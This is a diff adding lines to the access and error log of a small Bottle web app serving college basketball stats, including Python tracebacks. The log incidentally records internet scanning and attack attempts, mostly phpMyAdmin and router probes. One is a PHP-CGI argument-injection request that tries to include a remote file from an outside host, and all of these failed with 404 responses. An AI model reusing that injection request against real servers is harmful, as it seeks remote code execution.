@@ -1949,3 +1949,308 @@ KeyError: 'Indiana'
 212.129.25.214 - - [31/Mar/2017 14:19:03] "GET / HTTP/1.0" 200 7152
 66.249.64.236 - - [31/Mar/2017 15:10:13] "GET /robots.txt HTTP/1.1" 404 756
 66.249.64.236 - - [31/Mar/2017 15:10:13] "GET /team_stats/static/sorttable.js HTTP/1.1" 404 796
+----------------------------------------
+Exception happened during processing of request from ('178.140.80.5', 59868)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('166.137.8.114', 3893)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('166.137.246.91', 57899)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('166.137.246.91', 49377)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('67.164.229.210', 49834)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('67.164.229.210', 49873)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('213.52.130.153', 32854)
+----------------------------------------
+Bottle v0.12.13 server starting up (using WSGIRefServer())...
+Listening on http://0.0.0.0:80/
+Hit Ctrl-C to quit.
+
+67.164.229.210 - - [31/Mar/2017 15:59:29] "GET / HTTP/1.1" 200 7152
+67.164.229.210 - - [31/Mar/2017 15:59:31] "GET /bracket HTTP/1.1" 200 44437
+67.164.229.210 - - [31/Mar/2017 15:59:49] "GET /static/bracket_dict_2017.JSON HTTP/1.1" 304 0
+67.164.229.210 - - [31/Mar/2017 15:59:49] "GET /bracket HTTP/1.1" 200 44437
+67.164.229.210 - - [31/Mar/2017 15:59:49] "GET /static/probs.json HTTP/1.1" 304 0
+67.164.229.210 - - [31/Mar/2017 15:59:49] "GET /static/spreads2.json HTTP/1.1" 304 0
+67.164.229.210 - - [31/Mar/2017 15:59:50] "GET /static/probs.json HTTP/1.1" 200 151653
+67.164.229.210 - - [31/Mar/2017 15:59:52] "GET /static/spreads2.json HTTP/1.1" 200 150406
+67.164.229.210 - - [31/Mar/2017 15:59:52] "GET /static/team_images.JSON HTTP/1.1" 304 0
+/home/skellert/anaconda2/lib/python2.7/site-packages/bs4/__init__.py:166: UserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system ("lxml"). This usually isn't a problem, but if you run this code on another system, or in a different virtual environment, it may use a different parser and behave differently.
+
+To get rid of this warning, change this:
+
+ BeautifulSoup([your markup])
+
+to this:
+
+ BeautifulSoup([your markup], "lxml")
+
+  markup_type=markup_type))
+<string>:155: DeprecationWarning: unorderable dtypes; returning scalar but in the future this will be an error
+67.164.229.210 - - [31/Mar/2017 16:00:02] "GET /masters HTTP/1.1" 200 28901
+67.164.229.210 - - [31/Mar/2017 16:00:03] "GET /static/score_graph.csv HTTP/1.1" 200 295
+<string>:155: DeprecationWarning: unorderable dtypes; returning scalar but in the future this will be an error
+67.164.229.210 - - [31/Mar/2017 16:00:34] "GET /masters HTTP/1.1" 200 28901
+67.164.229.210 - - [31/Mar/2017 16:00:35] "GET /static/score_graph.csv HTTP/1.1" 200 348
+<string>:155: DeprecationWarning: unorderable dtypes; returning scalar but in the future this will be an error
+67.164.229.210 - - [31/Mar/2017 16:01:06] "GET /masters HTTP/1.1" 200 28901
+67.164.229.210 - - [31/Mar/2017 16:01:07] "GET /static/score_graph.csv HTTP/1.1" 304 0
+Bottle v0.12.13 server starting up (using WSGIRefServer())...
+Listening on http://0.0.0.0:80/
+Hit Ctrl-C to quit.
+
+/home/skellert/anaconda2/lib/python2.7/site-packages/bs4/__init__.py:166: UserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system ("lxml"). This usually isn't a problem, but if you run this code on another system, or in a different virtual environment, it may use a different parser and behave differently.
+
+To get rid of this warning, change this:
+
+ BeautifulSoup([your markup])
+
+to this:
+
+ BeautifulSoup([your markup], "lxml")
+
+  markup_type=markup_type))
+<string>:155: DeprecationWarning: unorderable dtypes; returning scalar but in the future this will be an error
+67.164.229.210 - - [31/Mar/2017 16:01:38] "GET /masters HTTP/1.1" 200 28716
+67.164.229.210 - - [31/Mar/2017 16:01:39] "GET /static/score_graph.csv HTTP/1.1" 304 0
+<string>:155: DeprecationWarning: unorderable dtypes; returning scalar but in the future this will be an error
+67.164.229.210 - - [31/Mar/2017 16:02:10] "GET /masters HTTP/1.1" 200 28716
+67.164.229.210 - - [31/Mar/2017 16:02:11] "GET /static/score_graph.csv HTTP/1.1" 304 0
+<string>:155: DeprecationWarning: unorderable dtypes; returning scalar but in the future this will be an error
+67.164.229.210 - - [31/Mar/2017 16:02:42] "GET /masters HTTP/1.1" 200 28716
+67.164.229.210 - - [31/Mar/2017 16:02:43] "GET /static/score_graph.csv HTTP/1.1" 304 0
+<string>:155: DeprecationWarning: unorderable dtypes; returning scalar but in the future this will be an error
+67.164.229.210 - - [31/Mar/2017 16:03:05] "GET /masters HTTP/1.1" 200 28716
+67.164.229.210 - - [31/Mar/2017 16:03:06] "GET /static/score_graph.csv HTTP/1.1" 200 64
+<string>:155: DeprecationWarning: unorderable dtypes; returning scalar but in the future this will be an error
+67.164.229.210 - - [31/Mar/2017 16:03:37] "GET /masters HTTP/1.1" 200 28716
+67.164.229.210 - - [31/Mar/2017 16:03:38] "GET /static/score_graph.csv HTTP/1.1" 304 0
+23.247.88.10 - - [31/Mar/2017 16:27:05] "GET / HTTP/1.1" 200 7152
+66.249.88.25 - - [31/Mar/2017 16:53:03] "GET / HTTP/1.1" 200 7152
+66.249.88.25 - - [31/Mar/2017 16:53:03] "GET /static/pto.PNG HTTP/1.1" 200 15017
+<string>:155: DeprecationWarning: unorderable dtypes; returning scalar but in the future this will be an error
+67.164.229.210 - - [31/Mar/2017 17:19:22] "GET /masters HTTP/1.1" 200 28719
+67.164.229.210 - - [31/Mar/2017 17:19:23] "GET /static/score_graph.csv HTTP/1.1" 200 64
+<string>:155: DeprecationWarning: unorderable dtypes; returning scalar but in the future this will be an error
+67.164.229.210 - - [31/Mar/2017 17:20:11] "GET /masters HTTP/1.1" 200 28719
+<string>:155: DeprecationWarning: unorderable dtypes; returning scalar but in the future this will be an error
+67.164.229.210 - - [31/Mar/2017 17:20:12] "GET /masters HTTP/1.1" 200 28719
+67.164.229.210 - - [31/Mar/2017 17:20:12] "GET /static/score_graph.csv HTTP/1.1" 200 150
+175.33.171.198 - - [31/Mar/2017 17:38:08] "GET / HTTP/1.0" 200 7152
+108.62.228.203 - - [31/Mar/2017 19:38:31] "GET / HTTP/1.1" 200 7152
+70.32.33.91 - - [31/Mar/2017 19:41:35] "GET / HTTP/1.1" 200 7152
+183.129.160.229 - - [31/Mar/2017 19:48:32] "POST /onvif/device_service HTTP/1.1" 404 762
+207.46.13.197 - - [31/Mar/2017 21:23:33] "GET /robots.txt HTTP/1.1" 404 752
+157.55.39.77 - - [31/Mar/2017 21:23:45] "GET / HTTP/1.1" 200 7152
+/home/skellert/git/website/KellertAnalytics/power_rankings_load.py:55: FutureWarning: sort(columns=....) is deprecated, use sort_values(by=.....)
+  data = data.sort("Offense", ascending = False)
+67.164.229.210 - - [31/Mar/2017 22:15:00] "GET /stats HTTP/1.1" 200 48600
+67.164.229.210 - - [31/Mar/2017 22:15:00] "GET /static/sorttable.js HTTP/1.1" 200 16877
+66.249.64.48 - - [31/Mar/2017 22:32:25] "GET /robots.txt HTTP/1.1" 404 752
+66.249.64.52 - - [31/Mar/2017 22:32:25] "GET / HTTP/1.1" 200 7152
+69.171.225.33 - - [31/Mar/2017 22:53:15] "GET /static/pto.PNG HTTP/1.1" 200 15017
+58.217.157.59 - - [31/Mar/2017 23:45:47] "GET /phpmyadmin HTTP/1.1" 404 739
+71.162.135.137 - - [01/Apr/2017 00:15:14] "GET / HTTP/1.1" 200 7152
+71.162.135.137 - - [01/Apr/2017 00:15:14] "GET /static/pto.PNG HTTP/1.1" 200 15017
+66.249.64.240 - - [01/Apr/2017 00:17:28] "GET / HTTP/1.1" 200 7152
+77.75.79.95 - - [01/Apr/2017 02:37:49] "GET /robots.txt HTTP/1.1" 404 739
+77.75.79.95 - - [01/Apr/2017 02:37:51] "GET / HTTP/1.1" 200 7152
+95.242.136.55 - - [01/Apr/2017 05:19:28] "GET / HTTP/1.0" 200 7152
+180.76.15.142 - - [01/Apr/2017 05:29:38] "GET /team_stats/Creighton HTTP/1.1" 200 9034
+69.171.225.13 - - [01/Apr/2017 05:53:09] "GET /static/pto.PNG HTTP/1.1" 200 15017
+49.128.207.240 - - [01/Apr/2017 06:04:58] "GET /phpmyadmin HTTP/1.1" 404 739
+185.76.10.33 - - [01/Apr/2017 06:34:06] "GET /recordings/theme/iefixes.css HTTP/1.1" 404 775
+23.247.88.20 - - [01/Apr/2017 07:38:12] "GET / HTTP/1.1" 200 7152
+185.169.230.8 - - [01/Apr/2017 08:26:27] "GET / HTTP/1.0" 200 7152
+185.188.182.33 - - [01/Apr/2017 08:42:22] "GET / HTTP/1.1" 200 7152
+78.129.250.84 - - [01/Apr/2017 08:48:20] "GET / HTTP/1.1" 200 7152
+185.169.230.8 - - [01/Apr/2017 09:54:52] "GET / HTTP/1.0" 200 7152
+5.255.250.5 - - [01/Apr/2017 10:27:40] "GET /robots.txt HTTP/1.1" 404 756
+5.255.250.5 - - [01/Apr/2017 10:27:44] "GET /static/pto.PNG HTTP/1.1" 200 15017
+141.8.143.219 - - [01/Apr/2017 10:30:35] "GET /robots.txt HTTP/1.1" 404 743
+141.8.143.219 - - [01/Apr/2017 10:30:39] "GET /favicon.ico HTTP/1.1" 404 745
+185.169.230.8 - - [01/Apr/2017 11:13:36] "GET / HTTP/1.0" 200 7152
+40.77.167.90 - - [01/Apr/2017 11:50:15] "GET / HTTP/1.1" 200 7152
+180.76.15.143 - - [01/Apr/2017 11:56:34] "GET /team_stats/Kentucky HTTP/1.1" 200 9028
+185.169.230.8 - - [01/Apr/2017 12:48:14] "GET / HTTP/1.0" 200 7152
+185.169.230.8 - - [01/Apr/2017 14:25:54] "GET / HTTP/1.0" 200 7152
+185.169.230.8 - - [01/Apr/2017 15:43:14] "GET / HTTP/1.0" 200 7152
+60.48.183.94 - - [01/Apr/2017 15:50:38] "GET / HTTP/1.0" 200 7152
+23.247.72.27 - - [01/Apr/2017 16:28:53] "GET / HTTP/1.1" 200 7152
+180.76.15.159 - - [01/Apr/2017 17:01:27] "GET / HTTP/1.1" 200 7152
+185.169.230.8 - - [01/Apr/2017 17:14:45] "GET / HTTP/1.0" 200 7152
+35.162.141.144 - - [01/Apr/2017 17:58:31] "GET / HTTP/1.1" 200 7152
+185.169.230.8 - - [01/Apr/2017 18:40:26] "GET / HTTP/1.0" 200 7152
+122.5.49.18 - - [01/Apr/2017 20:02:00] "OPTIONS / HTTP/1.1" 405 732
+185.169.230.8 - - [01/Apr/2017 20:05:08] "GET / HTTP/1.0" 200 7152
+35.162.141.144 - - [01/Apr/2017 21:04:20] "GET / HTTP/1.1" 200 7152
+66.249.64.55 - - [01/Apr/2017 21:07:21] "GET /robots.txt HTTP/1.1" 404 739
+66.249.64.51 - - [01/Apr/2017 21:07:21] "GET /team_stats/static/sorttable.js HTTP/1.1" 404 779
+185.169.230.8 - - [01/Apr/2017 21:49:03] "GET / HTTP/1.0" 200 7152
+185.169.230.8 - - [01/Apr/2017 23:10:31] "GET / HTTP/1.0" 200 7152
+35.162.141.144 - - [02/Apr/2017 00:37:34] "GET / HTTP/1.1" 200 7152
+185.169.230.8 - - [02/Apr/2017 00:43:14] "GET / HTTP/1.0" 200 7152
+66.249.64.51 - - [02/Apr/2017 01:25:03] "GET / HTTP/1.1" 200 7152
+185.169.230.8 - - [02/Apr/2017 02:22:15] "GET / HTTP/1.0" 200 7152
+177.182.148.18 - - [02/Apr/2017 02:23:38] "GET /hndUnblock.cgi HTTP/1.0" 404 747
+177.182.148.18 - - [02/Apr/2017 02:23:39] "GET /tmUnblock.cgi HTTP/1.0" 404 745
+177.182.148.18 - - [02/Apr/2017 02:23:39] "POST /cgi?2 HTTP/1.0" 404 727
+177.182.148.18 - - [02/Apr/2017 02:23:39] "GET / HTTP/1.0" 200 7152
+66.249.66.178 - - [02/Apr/2017 03:32:06] "GET /robots.txt HTTP/1.1" 404 752
+66.249.66.181 - - [02/Apr/2017 03:32:06] "GET / HTTP/1.1" 200 7152
+185.169.230.8 - - [02/Apr/2017 03:37:05] "GET / HTTP/1.0" 200 7152
+66.249.66.189 - - [02/Apr/2017 04:53:11] "GET / HTTP/1.1" 200 7152
+76.69.213.59 - - [02/Apr/2017 05:06:17] "GET / HTTP/1.0" 200 7152
+185.169.230.8 - - [02/Apr/2017 05:17:42] "GET / HTTP/1.0" 200 7152
+66.249.66.184 - - [02/Apr/2017 05:49:03] "GET / HTTP/1.1" 200 7152
+157.55.39.86 - - [02/Apr/2017 06:31:26] "GET /robots.txt HTTP/1.1" 404 752
+185.169.230.8 - - [02/Apr/2017 06:46:53] "GET / HTTP/1.0" 200 7152
+66.249.66.41 - - [02/Apr/2017 06:55:11] "GET /robots.txt HTTP/1.1" 404 756
+66.249.66.35 - - [02/Apr/2017 06:55:11] "GET / HTTP/1.1" 200 7152
+Traceback (most recent call last):
+  File "/home/skellert/anaconda2/lib/python2.7/site-packages/bottle.py", line 862, in _handle
+    return route.call(**args)
+  File "/home/skellert/anaconda2/lib/python2.7/site-packages/bottle.py", line 1740, in wrapper
+    rv = callback(*a, **ka)
+  File "run.py", line 57, in team_stats
+    return template("team_stats.html", url=url, stats=stats, teams=team_images, team=team)
+  File "/home/skellert/anaconda2/lib/python2.7/site-packages/bottle.py", line 3619, in template
+    return TEMPLATES[tplid].render(kwargs)
+  File "/home/skellert/anaconda2/lib/python2.7/site-packages/bottle.py", line 3409, in render
+    self.execute(stdout, env)
+  File "/home/skellert/anaconda2/lib/python2.7/site-packages/bottle.py", line 3396, in execute
+    eval(self.co, env)
+  File "/home/skellert/git/website/KellertAnalytics/team_stats.html", line 122, in <module>
+    <h1 style="text-align: left;float:left;"><img src={{teams[team]}} class="team_logo"></h1>
+KeyError: 'Pittsburgh'
+180.76.15.16 - - [02/Apr/2017 07:10:11] "GET /team_stats/Pittsburgh HTTP/1.1" 500 2051
+157.55.39.229 - - [02/Apr/2017 07:16:13] "GET / HTTP/1.1" 200 7152
+185.169.230.8 - - [02/Apr/2017 08:05:19] "GET / HTTP/1.0" 200 7152
+66.249.66.41 - - [02/Apr/2017 08:27:26] "GET / HTTP/1.1" 200 7152
+192.151.152.122 - - [02/Apr/2017 08:40:46] "GET /wp-content/plugins/stats-wp/readme.txt HTTP/1.1" 404 799
+192.151.152.122 - - [02/Apr/2017 08:40:46] "GET /wp-content/plugins/wp-handy-lightbox/readme.txt HTTP/1.1" 404 817
+192.151.152.122 - - [02/Apr/2017 08:40:46] "GET /wp-content/plugins/gallery-slider/readme.txt HTTP/1.1" 404 811
+192.151.152.122 - - [02/Apr/2017 08:40:46] "GET /wp-content/plugins/seo-keyword-page/readme.txt HTTP/1.1" 404 815
+5.255.250.5 - - [02/Apr/2017 09:18:06] "GET /robots.txt HTTP/1.1" 404 756
+5.255.250.5 - - [02/Apr/2017 09:18:10] "GET /details HTTP/1.1" 200 25152
+185.169.230.8 - - [02/Apr/2017 09:29:54] "GET / HTTP/1.0" 200 7152
+66.249.66.184 - - [02/Apr/2017 09:33:36] "GET / HTTP/1.1" 200 7152
+115.73.188.239 - - [02/Apr/2017 09:47:57] "GET / HTTP/1.0" 200 7152
+180.76.15.20 - - [02/Apr/2017 10:18:11] "GET /team_stats/Arkansas HTTP/1.1" 200 9031
+185.169.230.8 - - [02/Apr/2017 11:11:06] "GET / HTTP/1.0" 200 7152
+178.238.228.46 - - [02/Apr/2017 11:52:54] "GET / HTTP/1.0" 200 7152
+191.96.249.97 - - [02/Apr/2017 12:03:58] "GET /phpmyadmin/scripts/setup.php HTTP/1.0" 404 789
+69.58.178.57 - - [02/Apr/2017 12:10:10] "GET /robots.txt HTTP/1.1" 404 756
+69.58.178.57 - - [02/Apr/2017 12:10:11] "GET / HTTP/1.1" 200 7152
+69.58.178.57 - - [02/Apr/2017 12:10:13] "GET /details HTTP/1.1" 200 25152
+/home/skellert/git/website/KellertAnalytics/power_rankings_load.py:28: FutureWarning: sort(columns=....) is deprecated, use sort_values(by=.....)
+  data = data.sort("PtDiff", ascending = False)
+69.58.178.57 - - [02/Apr/2017 12:10:16] "GET /powerrankings HTTP/1.1" 200 104009
+69.58.178.57 - - [02/Apr/2017 12:10:18] "GET /stats HTTP/1.1" 200 48600
+69.58.178.57 - - [02/Apr/2017 12:10:20] "GET /projections HTTP/1.1" 200 16499
+69.58.178.57 - - [02/Apr/2017 12:10:22] "GET /bracket HTTP/1.1" 200 44437
+69.58.178.57 - - [02/Apr/2017 12:10:23] "GET /team_stats/Villanova HTTP/1.1" 200 9011
+69.58.178.57 - - [02/Apr/2017 12:10:24] "GET /team_stats/Gonzaga HTTP/1.1" 200 9032
+69.58.178.57 - - [02/Apr/2017 12:10:25] "GET /team_stats/Kentucky HTTP/1.1" 200 9028
+69.58.178.57 - - [02/Apr/2017 12:10:26] "GET /team_stats/Kansas HTTP/1.1" 200 9032
+66.249.66.189 - - [02/Apr/2017 12:36:45] "GET /robots.txt HTTP/1.1" 404 739
+66.249.66.183 - - [02/Apr/2017 12:36:45] "GET /powerrankings HTTP/1.1" 200 104009
+185.169.230.8 - - [02/Apr/2017 12:41:07] "GET / HTTP/1.0" 200 7152
+139.162.114.70 - - [02/Apr/2017 13:56:07] "GET / HTTP/1.1" 200 7152
+77.75.78.165 - - [02/Apr/2017 14:02:24] "GET /robots.txt HTTP/1.1" 404 739
+77.75.78.165 - - [02/Apr/2017 14:02:26] "GET / HTTP/1.1" 200 7152
+5.255.250.5 - - [02/Apr/2017 14:06:31] "GET /robots.txt HTTP/1.1" 404 756
+5.255.250.5 - - [02/Apr/2017 14:06:35] "GET /team_stats/Gonzaga HTTP/1.1" 200 9032
+185.169.230.8 - - [02/Apr/2017 14:10:01] "GET / HTTP/1.0" 200 7152
+66.249.66.183 - - [02/Apr/2017 14:13:14] "GET / HTTP/1.1" 200 7152
+67.164.229.210 - - [02/Apr/2017 15:09:19] "GET /bracket HTTP/1.1" 200 44437
+67.164.229.210 - - [02/Apr/2017 15:09:19] "GET /static/bracket_dict_2017.JSON HTTP/1.1" 304 0
+67.164.229.210 - - [02/Apr/2017 15:09:20] "GET /static/probs.json HTTP/1.1" 304 0
+67.164.229.210 - - [02/Apr/2017 15:09:20] "GET /static/spreads2.json HTTP/1.1" 304 0
+67.164.229.210 - - [02/Apr/2017 15:09:20] "GET /static/team_images.JSON HTTP/1.1" 304 0
+185.169.230.8 - - [02/Apr/2017 15:24:31] "GET / HTTP/1.0" 200 7152
+180.76.15.141 - - [02/Apr/2017 15:37:44] "GET / HTTP/1.1" 200 7152
+168.1.128.53 - - [02/Apr/2017 15:55:33] "GET / HTTP/1.0" 200 7152
+183.129.160.229 - - [02/Apr/2017 16:11:39] "POST /onvif/device_service HTTP/1.1" 404 762
+141.8.143.219 - - [02/Apr/2017 16:29:57] "GET /team_stats/North_Dakota HTTP/1.1" 200 9038
+5.255.250.5 - - [02/Apr/2017 16:32:03] "GET /team_stats/Cincinnati HTTP/1.1" 200 9009
+5.255.250.5 - - [02/Apr/2017 16:36:04] "GET /team_stats/ETSU HTTP/1.1" 200 9030
+5.255.250.5 - - [02/Apr/2017 16:41:02] "GET /team_stats/Minnesota HTTP/1.1" 200 9035
+5.255.250.5 - - [02/Apr/2017 16:46:27] "GET /team_stats/Kent HTTP/1.1" 200 9029
+185.169.230.8 - - [02/Apr/2017 17:06:21] "GET / HTTP/1.0" 200 7152
+5.255.250.5 - - [02/Apr/2017 17:16:33] "GET /team_stats/Butler HTTP/1.1" 200 9030
+5.255.250.5 - - [02/Apr/2017 17:20:07] "GET /team_stats/Wake_Forest HTTP/1.1" 200 9036
+66.249.66.186 - - [02/Apr/2017 17:21:15] "GET /powerrankings HTTP/1.1" 200 104009
+5.255.250.5 - - [02/Apr/2017 17:22:02] "GET /team_stats/Rhode_Island HTTP/1.1" 200 9037
+5.255.250.5 - - [02/Apr/2017 17:27:33] "GET /team_stats/S_Dakota_St HTTP/1.1" 200 9035
+5.255.250.5 - - [02/Apr/2017 17:43:04] "GET /robots.txt HTTP/1.1" 404 743
+5.255.250.5 - - [02/Apr/2017 17:43:08] "GET / HTTP/1.1" 200 7152
+5.255.250.5 - - [02/Apr/2017 17:45:34] "GET /powerrankings HTTP/1.1" 200 104009
+5.255.250.5 - - [02/Apr/2017 17:45:37] "GET /team_stats/Wisconsin HTTP/1.1" 200 9032
+116.52.12.102 - - [02/Apr/2017 17:51:59] "GET /manager/html HTTP/1.1" 404 743
+5.255.250.5 - - [02/Apr/2017 18:12:36] "GET /team_stats/N_Kentucky HTTP/1.1" 200 9034
+40.77.167.112 - - [02/Apr/2017 18:17:50] "GET / HTTP/1.1" 200 7152
+185.169.230.8 - - [02/Apr/2017 18:21:16] "GET / HTTP/1.0" 200 7152
+46.83.199.252 - - [02/Apr/2017 18:40:10] "GET / HTTP/1.0" 200 7152
+Traceback (most recent call last):
+  File "/home/skellert/anaconda2/lib/python2.7/site-packages/bottle.py", line 862, in _handle
+    return route.call(**args)
+  File "/home/skellert/anaconda2/lib/python2.7/site-packages/bottle.py", line 1740, in wrapper
+    rv = callback(*a, **ka)
+  File "run.py", line 57, in team_stats
+    return template("team_stats.html", url=url, stats=stats, teams=team_images, team=team)
+  File "/home/skellert/anaconda2/lib/python2.7/site-packages/bottle.py", line 3619, in template
+    return TEMPLATES[tplid].render(kwargs)
+  File "/home/skellert/anaconda2/lib/python2.7/site-packages/bottle.py", line 3409, in render
+    self.execute(stdout, env)
+  File "/home/skellert/anaconda2/lib/python2.7/site-packages/bottle.py", line 3396, in execute
+    eval(self.co, env)
+  File "/home/skellert/git/website/KellertAnalytics/team_stats.html", line 122, in <module>
+    <h1 style="text-align: left;float:left;"><img src={{teams[team]}} class="team_logo"></h1>
+KeyError: "Mt St Mary's"
+180.76.15.24 - - [02/Apr/2017 18:46:10] "GET /team_stats/Mt_St_Mary's HTTP/1.1" 500 2069
+191.96.249.97 - - [02/Apr/2017 18:49:01] "GET /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n HTTP/1.1" 404 1009
+5.255.250.5 - - [02/Apr/2017 19:01:02] "GET /team_stats/Troy HTTP/1.1" 200 9029
+178.164.11.236 - - [02/Apr/2017 19:18:38] "GET / HTTP/1.1" 200 7152
+178.164.11.236 - - [02/Apr/2017 19:18:39] "GET /HNAP1/ HTTP/1.1" 404 731
+66.102.6.92 - - [02/Apr/2017 19:23:46] "GET / HTTP/1.1" 200 7152
+66.102.6.92 - - [02/Apr/2017 19:23:46] "GET /static/pto.PNG HTTP/1.1" 200 15017
+141.212.122.145 - - [02/Apr/2017 19:47:22] "GET /x HTTP/1.1" 404 735
+185.169.230.8 - - [02/Apr/2017 19:48:13] "GET / HTTP/1.0" 200 7152
+5.255.250.5 - - [02/Apr/2017 20:03:32] "GET /team_stats/UCLA HTTP/1.1" 200 9029
+5.255.250.5 - - [02/Apr/2017 20:03:36] "GET /team_stats/UC_Davis HTTP/1.1" 200 9034
+5.255.250.5 - - [02/Apr/2017 20:03:39] "GET /team_stats/Purdue HTTP/1.1" 200 9027
+5.255.250.5 - - [02/Apr/2017 20:03:43] "GET /team_stats/Seton_Hall HTTP/1.1" 200 9035
+5.255.250.5 - - [02/Apr/2017 20:03:46] "GET /team_stats/North_Carolina HTTP/1.1" 200 9040
+66.249.66.186 - - [02/Apr/2017 20:39:56] "GET / HTTP/1.1" 200 7152
+185.169.230.8 - - [02/Apr/2017 21:09:49] "GET / HTTP/1.0" 200 7152
+46.4.45.162 - - [02/Apr/2017 22:09:24] "GET /muieblackcat HTTP/1.1" 404 743
+46.4.45.162 - - [02/Apr/2017 22:09:25] "GET //phpMyAdmin/scripts/setup.php HTTP/1.1" 404 776
+46.4.45.162 - - [02/Apr/2017 22:09:25] "GET //phpmyadmin/scripts/setup.php HTTP/1.1" 404 776
+46.4.45.162 - - [02/Apr/2017 22:09:25] "GET //pma/scripts/setup.php HTTP/1.1" 404 762
+46.4.45.162 - - [02/Apr/2017 22:09:25] "GET //myadmin/scripts/setup.php HTTP/1.1" 404 770
+46.4.45.162 - - [02/Apr/2017 22:09:25] "GET //MyAdmin/scripts/setup.php HTTP/1.1" 404 770
+185.169.230.8 - - [02/Apr/2017 22:40:11] "GET / HTTP/1.0" 200 7152
+66.249.64.53 - - [02/Apr/2017 22:51:16] "GET /powerrankings HTTP/1.1" 200 104009
+189.172.170.72 - - [02/Apr/2017 22:56:17] "GET / HTTP/1.0" 200 7152
+66.249.64.55 - - [02/Apr/2017 23:01:36] "GET / HTTP/1.1" 200 7152
+66.249.64.236 - - [02/Apr/2017 23:57:18] "GET /robots.txt HTTP/1.1" 404 756
+66.249.64.244 - - [02/Apr/2017 23:57:18] "GET / HTTP/1.1" 200 7152
+146.0.77.88 - - [03/Apr/2017 00:01:48] "GET / HTTP/1.1" 200 7152
+146.0.77.88 - - [03/Apr/2017 00:03:21] "GET / HTTP/1.1" 200 7152
+185.169.230.8 - - [03/Apr/2017 00:32:28] "GET / HTTP/1.0" 200 7152
+66.249.64.52 - - [03/Apr/2017 00:43:05] "GET /robots.txt HTTP/1.1" 404 752
+66.249.64.52 - - [03/Apr/2017 00:43:05] "GET / HTTP/1.1" 200 7152
+27.105.104.2 - - [03/Apr/2017 00:45:59] "GET / HTTP/1.0" 200 7152
+165.225.0.76 - - [03/Apr/2017 01:23:30] "GET / HTTP/1.1" 200 7152
+165.225.0.76 - - [03/Apr/2017 01:23:31] "GET /favicon.ico HTTP/1.1" 404 741
+185.169.230.8 - - [03/Apr/2017 01:36:19] "GET / HTTP/1.0" 200 7152
+66.249.64.244 - - [03/Apr/2017 02:49:13] "GET / HTTP/1.1" 200 7152
